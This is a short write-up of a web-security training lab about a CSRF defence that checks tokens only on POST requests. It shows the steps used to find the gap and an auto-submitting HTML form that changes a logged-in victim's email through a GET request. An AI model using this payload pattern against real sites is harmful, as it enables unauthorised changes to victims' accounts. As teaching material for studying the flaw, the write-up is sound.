# CSRF where token validation depends on request method
* This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defense to certain types of requests.
	* To solve the lab, use yuor exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
	* You can log in to your own account using the following credentials: `wienere:peter`

### 1. Capture the request when change an email
* Log in as _wiener_, capture the _POST_ request and send it to Repeater

![1](https://user-images.githubusercontent.com/53956303/153525579-ccef2a93-6041-4363-a1d4-6fca31c7a730.png)
### 2. Try to send a request with an invalid CSRF token
![2](https://user-images.githubusercontent.com/53956303/153525679-774a6bf5-145b-4d18-9040-32b2cfc770c6.png)
* It returns 404 status code, and a message "Invaild CSRF token".

### 3. Try to send a request with an invalid CSRF token as _GET_ request
* right click and click "Change method" and send the request with an invalid CSRF token

![3](https://user-images.githubusercontent.com/53956303/153525820-3e967b54-b7b0-42ad-82d5-781c8e7e4dd8.png)
* it returns 302 response, which means that the CSRF token is no longer verified.

### 4. Make a malicious HTML on the exploit sever
* Use the information from the request 
```html
<form method=GET action=https://ac841f8c1e540650c03e2ea2005c00dd.web-security-academy.net/my-account/change-email>
    <input type="hidden" name="email" value="pwnedwiener@pwn.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
* Put this exploit to the "Exploit server", Click "Store" and "Deliver exploit to victim" to execute the exploit

![4](https://user-images.githubusercontent.com/53956303/153526378-9f1fa59d-dea0-483a-8de5-dce0ee741bf7.png)
* As a result, the lab is solved!

![5](https://user-images.githubusercontent.com/53956303/153526646-aa004025-fefd-4b45-8637-8e98b484842d.png)
